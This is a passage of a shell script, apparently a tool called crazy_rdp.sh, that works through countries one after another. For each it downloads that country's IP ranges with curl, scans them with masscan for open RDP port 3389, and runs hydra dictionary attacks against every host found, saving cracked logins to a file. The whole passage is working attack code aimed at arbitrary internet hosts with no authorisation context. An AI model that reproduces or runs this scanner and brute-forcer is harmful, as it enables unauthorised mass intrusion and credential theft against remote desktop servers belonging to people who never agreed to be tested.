echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "158" ]; then
curl http://ipdiapazon.16mb.com/Saint_lucia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "159" ]; then
curl http://ipdiapazon.16mb.com/Samoa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "160" ]; then
curl http://ipdiapazon.16mb.com/San_marino.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "161" ]; then
curl http://ipdiapazon.16mb.com/Saudi_arabia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "162" ]; then
curl http://ipdiapazon.16mb.com/Senegal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "163" ]; then
curl http://ipdiapazon.16mb.com/Serbia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "164" ]; then
curl http://ipdiapazon.16mb.com/Seychelles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "165" ]; then
curl http://ipdiapazon.16mb.com/Sierra_leone.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "166" ]; then
curl http://ipdiapazon.16mb.com/Singapore.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "167" ]; then
curl http://ipdiapazon.16mb.com/Slovakia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else
if [ $country = "168" ]; then
curl http://ipdiapazon.16mb.com/Slovenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "169" ]; then
curl http://ipdiapazon.16mb.com/Solomon_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "170" ]; then
curl http://ipdiapazon.16mb.com/South_africa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
